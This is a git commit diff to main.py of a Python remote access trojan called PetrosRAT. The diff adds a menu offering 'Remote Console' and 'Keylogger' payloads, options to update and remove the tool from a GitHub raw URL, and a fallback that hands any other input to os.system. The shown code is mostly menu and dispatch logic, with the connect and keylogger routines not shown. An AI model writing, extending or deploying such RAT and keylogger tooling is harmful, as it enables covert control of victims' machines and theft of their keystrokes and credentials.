9fdf2670391cb76285b619a42f41649734cb4512
petros <petros@kali.kali>
2025-01-03 07:59:40 -0600

    changes to main.py

--- main.py
+++ main.py
@@ -36,16 +36,26 @@ help_menu = """
 """
 
 options_menu = """
-        [*] Select A Number To Select a Payload [*]
+        [+] Payloads:
+            [0] - Remote Console
+            [1] - Keylogger
         
-        
-        Payloads:
-            [0] Remote Console
-            [1] 
+        [+] Options:
+            [h] or [help]       -- Help Menu
+            [v] or [version]    -- Version Number
+            [u] or [update]     -- Update PetrosRAT
+            [r] or [remove]     -- Remove PetrosRAT
+            [q] or [quit]       -- Quit
+            
+        [*] Selecct an [option]...
+            
+            
 """
 
-username = getpass.getuser()
-header =f"{username}@RAT $ " 
+username = getpass.getuser() # gets username
+header =f"{username}@RAT $ " # sets up user input interface
+remote_path = "raw.githubusercontent.com/peterpapath/RAT/refs/heads/main" # url path for RAT files
+local_path = f"/home/{username}/RAT" if username != "root" else "/root/RAT" # gets path of RAT
 
 # read config file
 def read_config(config_file):
@@ -106,9 +116,37 @@ def cli(arguments):
         working_directory = configuration.get("WORKING DIRECTORY")
 
 
-
+        # remote console
         if config_file == "0":
             connect(ipv4, password)
+        
+        # help me
+        elif config_file == "h" or config_file == "help":
+            main()
+            
+        # get version number
+        elif config_file == "v" or config_file == "version":
+            os.system(f"cat {local_path}/version.txt")
+            
+        # update option
+        elif config_file == "u" or config_file == "update":
+            update()
+            exit()
+            
+        # remove installation
+        elif config_file == "r" or config_file == "remove" or config_file == "uninstall":
+            remove()
+            
+        # quit option
+        elif config_file == "q" or config_file == "quit" or config_file == "exit":
+            exit()
+        
+        # exception
+        else:
+            os.system(config_file)
+            
+        # print new line
+        print("\n")
 
     # if arguments dont exist
     else:
